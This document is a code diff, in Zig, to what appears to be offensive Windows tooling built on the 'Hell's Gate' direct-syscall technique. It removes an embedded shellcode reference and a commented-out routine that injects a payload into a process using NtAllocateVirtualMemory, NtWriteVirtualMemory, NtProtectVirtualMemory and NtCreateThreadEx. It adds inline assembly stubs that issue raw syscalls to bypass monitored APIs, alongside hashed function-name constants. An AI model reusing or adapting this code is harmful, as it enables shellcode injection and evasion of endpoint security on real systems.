@@ -39,10 +39,6 @@ const NtWriteVirtualMemory_djb2: u64 = 0xF5E50822A1E6CA7C;
 const NtProtectVirtualMemory_djb2: u64 = 0x68340BF4DD70E832;
 const NtCreateThreadEx_djb2: u64 = 0xD6BC9C637D9E5F1A;
 
-const shellcode = @embedFile("hells_gate.bin");
-const hells_gate_offset = 0;
-const hells_descent_offset = 7;
-
 // Global assembly - Hell's Gate implementation
 // Zig only support AT&T syntax due to LLVM for now
 comptime {
@@ -575,67 +571,54 @@ pub fn isAvailable() bool {
     return currentPeb.OSMajorVersion == 0xA;
 }
 
-// fn classicInjectionViaSyscalls(vx_table: *VX_TABLE, process_handle: HANDLE, payload: [*]const u8, payload_size: SIZE_T) bool {
-//     const nt_success = NTSTATUS.SUCCESS;
-//     var status: NTSTATUS = nt_success;
-//     var address: ?PVOID = @ptrFromInt(0);
-//     var old_protection: ULONG = 0;
-//     var size: SIZE_T = payload_size;
-//     var bytes_written: SIZE_T = 0;
-//     var thread_handle: HANDLE = undefined;
-//
-//     // Step 1: Allocate memory using Hell's Gate
-//     hells_gate(vx_table.NtAllocateVirtualMemory.system_call);
-//     status = hells_descent(@intFromPtr(process_handle), @intFromPtr(&address), 0, @intFromPtr(&size), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE, 0, 0, 0, 0, 0);
-//
-//     if (status != nt_success) {
-//         print("[!] NtAllocateVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
-//         return false;
-//     }
-//
-//     print("[+] Allocated Address At : 0x{X} Of Size : {d}\n", .{ @intFromPtr(address), size });
-//     // waitForEnter("[#] Press <Enter> To Write The Payload ... ");
-//
-//     // Step 2: Write the payload
-//     print("\t[i] Writing Payload Of Size {d} ... ", .{payload_size});
-//     hells_gate(vx_table.NtWriteVirtualMemory.system_call);
-//     status = hells_descent(@intFromPtr(process_handle), @intFromPtr(address), @intFromPtr(payload), payload_size, @intFromPtr(&bytes_written), 0, 0, 0, 0, 0, 0);
-//
-//     if (status != nt_success or bytes_written != payload_size) {
-//         print("[!] NtWriteVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
-//         print("[i] Bytes Written : {d} of {d}\n", .{ bytes_written, payload_size });
-//         return false;
-//     }
-//     print("[+] DONE\n", .{});
-//
-//     // Step 3: Change memory protection to executable
-//     hells_gate(vx_table.NtProtectVirtualMemory.system_call);
-//     status = hells_descent(@intFromPtr(process_handle), @intFromPtr(&address), @intFromPtr(&payload_size), PAGE_EXECUTE_READWRITE, @intFromPtr(&old_protection), 0, 0, 0, 0, 0, 0);
-//
-//     if (status != nt_success) {
-//         print("[!] NtProtectVirtualMemory Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
-//         return false;
-//     }
-//
-//     // Step 4: Execute the payload via thread
-//     // waitForEnter("[#] Press <Enter> To Run The Payload ... ");
-//     print("\t[i] Running Thread Of Entry 0x{X} ... ", .{@intFromPtr(address)});
-//     hells_gate(vx_table.NtCreateThreadEx.system_call);
-//     status = hells_descent(@intFromPtr(&thread_handle), THREAD_ALL_ACCESS, 0, // NULL object attributes
-//         @intFromPtr(process_handle), @intFromPtr(address), 0, // NULL parameter
-//         0, // Create flags
-//         0, // Stack zero bits
-//         0, // Size of stack commit
-//         0, // Size of stack reserve
-//         0 // Bytes buffer
-//     );
-//
-//     if (status != nt_success) {
-//         print("[!] NtCreateThreadEx Failed With Error : 0x{X:0>8}\n", .{@intFromEnum(status)});
-//         return false;
-//     }
-//     print("[+] DONE\n", .{});
-//     print("\t[+] Thread Created With Id : {d}\n", .{GetThreadId(thread_handle)});
-//
-//     return true;
-// }
+pub fn init() !void {
+    if (@import("builtin").target.cpu.arch == .x86_64) {
+        asm volatile (
+            \\.data
+            \\w_system_call: .long 0
+            \\
+            \\.text
+            \\.globl _hells_gate
+            \\_hells_gate:
+            \\    movl $0, w_system_call(%rip)
+            \\    movl %ecx, w_system_call(%rip)
+            \\    ret
+            \\
+            \\.globl _hells_descent
+            \\_hells_descent:
+            \\    mov %rcx, %r10
+            \\    movl w_system_call(%rip), %eax
+            \\    syscall
+            \\    ret
+        );
+    } else {
+        asm volatile (
+            \\ .section .data
+            \\ limbo_callback:
+            \\     .long 0
+            \\ 
+            \\ limbo_syscall:
+            \\     .long 0
+            \\ 
+            \\ .section .text
+            \\ .code32
+            \\ 
+            \\ .globl _limbo_hell
+            \\ _limbo_hell:
+            \\     movl %ecx, limbo_callback
+            \\     ret
+            \\ 
+            \\ .globl _hells_gate
+            \\ _hells_gate:
+            \\     movl %ecx, limbo_syscall
+            \\     ret
+            \\ 
+            \\ .globl _hells_descent
+            \\ _hells_descent:
+            \\     movl limbo_syscall, %eax
+            \\     movl limbo_callback, %edx
+            \\     call *%edx
+            \\     ret
+        );
+    }
+}
